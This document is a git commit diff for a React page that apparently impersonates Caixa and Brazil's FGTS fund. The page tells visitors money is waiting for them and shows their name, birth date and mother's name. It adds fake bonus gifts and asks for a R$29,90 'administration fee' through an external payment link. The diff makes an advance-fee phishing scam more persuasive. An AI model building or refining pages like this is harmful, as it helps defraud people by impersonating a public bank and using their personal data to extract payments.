4947633f791d989cddea8b20f70247648d7de00a
unknown <tmrafinha4@gmail.com>
2024-11-18 13:17:01 -0300

    teste nova pagina de vendas, com novos items. caso nao funcionar, voltar uma versão

--- src/pages/pagamento-tarifa.tsx
+++ src/pages/pagamento-tarifa.tsx
@@ -1,12 +1,17 @@
 import { useEffect, useState } from "react";
 import logo from "../assets/caixalogo.png";
 import logofgts from "../assets/fgts2.png";
+import caixa from "../assets/logo.png";
 import pix from "../assets/pix.png";
 import { IoIosWarning } from "react-icons/io";
 import { Helmet } from "react-helmet";
 import { UserData } from "../types/userData";
 import cartao from "../assets/cartao.png"
+import box from "../assets/box.png"
+import carrinho from "../assets/carrinho.png"
 import logocaixa from "../assets/caixalogo.png"
+import flogo from "../assets/f-logo.png"
+import { BiDownArrowAlt } from "react-icons/bi";
 
 
 
@@ -102,7 +107,7 @@ export function PagamentoTarifa() {
             </header>
 
             {/* Conteúdo principal */}
-            <main className="flex flex-col items-center justify-center text-center px-4 py-6 space-y-4">
+            <main className="flex flex-col items-center justify-center text-center px-4 py-6 space-y-6">
                 <h1 className="text-3xl font-bold text-gray-800">VOCÊ TEM DINHEIRO<br />PARA RECEBER</h1>
 
                 <span className="text-xl">ASSISTA O VÍDEO PARA ENTENDER</span>
@@ -114,23 +119,69 @@ export function PagamentoTarifa() {
                     </Helmet>
                 </div>
 
-                {/* Botão de confirmação */}
+                <div className="bg-primary w-full flex p-6 pb-10 flex-col items-center space-y-6">
+                    <img width={300} src={caixa} alt="" />
 
-                <a href="https://pay.pagamentofgt.shop/KV603k01qyEZw8y" className="w-full">
-                    <button className="bg-green-500 w-full hover:bg-green-600 text-white font-bold py-3 px-6 rounded-md shadow-lg transition-all duration-200 animate-bounce mt-3">
-                        PAGAR TAXA E SACAR MEU FGTS
-                    </button>
-                </a>
+                    <div className="flex items-center space-x-2 animate-bounce">
+                        <BiDownArrowAlt className="text-white text-4xl" />
+                        <div className="text-white text-3xl">Arraste para baixo</div>
+                        <BiDownArrowAlt className="text-white text-4xl" />
+                    </div>
+                </div>
 
+                <div className="space-y-4 w-full">
+                    {/* Nome */}
+                    <div className="flex items-center space-x-2">
 
+                        <input
+                            type="text"
+                            value={userData?.nome}
+                            readOnly
+                            className="border-b border-b-orange-500 w-full text-lg outline-none bg-transparent"
+                            placeholder="Nome"
+                        />
+                    </div>
+
+                    {/* Data de Nascimento */}
+                    <div className="flex items-center space-x-2">
+
+                        <input
+                            type="text"
+                            value={userData?.dataNascimento}
+                            readOnly
+                            className="border-b border-b-orange-500 w-full text-lg outline-none bg-transparent"
+                            placeholder="Data de Nascimento"
+                        />
+                    </div>
+
+                    {/* Nome da Mãe */}
+                    {userData?.nomeMae && (
+                        <div className="flex items-center space-x-2">
+
+                            <input
+                                type="text"
+                                value={userData?.nomeMae}
+                                readOnly
+                                className="border-b border-b-orange-500 w-full text-lg outline-none bg-transparent"
+                                placeholder="Nome da Mãe"
+                            />
+                        </div>
+                    )}
+                </div>
 
 
                 {/* Informações sobre o saque disponível */}
-                <div>
+                <div className="">
                     <p className="text-xl mb-2 text-gray-500 my-2">Valor disponível para saque:</p>
                     <p className="text-6xl font-semibold text-green-600">R$ {displayedAmount.toFixed(2)}</p>
                 </div>
 
+                <div className="flex items-center space-x-2">
+                    <div className="bg-orange-500 p-2 rounded-full w-fit">
+                        <img width={20} src={flogo} alt="" />
+                    </div>
+                    <h2 className="text-3xl text-primary-dark font-semibold">+ Brindes:</h2>
+                </div>
 
                 <div className="flex space-x-2 w-full p-2 bg-zinc-100 rounded-lg">
                     <img src={cartao} alt="cartao" width={120} />
@@ -139,6 +190,24 @@ export function PagamentoTarifa() {
                         <span>R$15.000 de limite</span>
                     </div>
                 </div>
+
+                <div className="flex space-x-2 w-full p-2 bg-zinc-100 rounded-lg">
+                    <img src={carrinho} alt="cartao" width={130} />
+                    <div className="flex flex-col justify-normal">
+                        <h3 className="font-semibold  text-xl text-zinc-700">+ Vale compra de <span className="text-yellow-600">R$400</span></h3>
+                        <span>Válido em todos os mercados</span>
+                    </div>
+                </div>
+
+                <div className="flex space-x-2 w-full p-2 bg-zinc-100 rounded-lg">
+                    <img src={box} alt="cartao" width={130} />
+                    <div className="flex flex-col justify-normal">
+                        <h3 className="font-semibold  text-xl text-zinc-700">+ Presente <span className="text-yellow-600">Secreto</span></h3>
+                        <span>Até R$50.000 em prêmios</span>
+                    </div>
+                </div>
+
+
 
                 <h3 className="text-xl text-zinc-500">Basta pagar a taxa de administração Caixa que seu dinheiro cairá em até 3 minutos.</h3>
 
@@ -152,6 +221,12 @@ export function PagamentoTarifa() {
                     {/* <p className="text-2xl mb-2 text-zinc-400">DE: R$47,89</p> */}
                     <p className="text-4xl font-semibold text-primary">R$29,90</p>
                 </div>
+
+                <a href="https://pay.pagamentofgt.shop/KV603k01qyEZw8y" className="w-full">
+                    <button className="bg-green-500 w-full hover:bg-green-600 text-white font-bold py-3 px-6 rounded-md shadow-lg transition-all duration-200 animate-bounce mt-3">
+                        PAGAR TAXA E SACAR MEU FGTS
+                    </button>
+                </a>
 
 
                 {/* Sessão com imagem do Pix e mensagem de justificativa */}
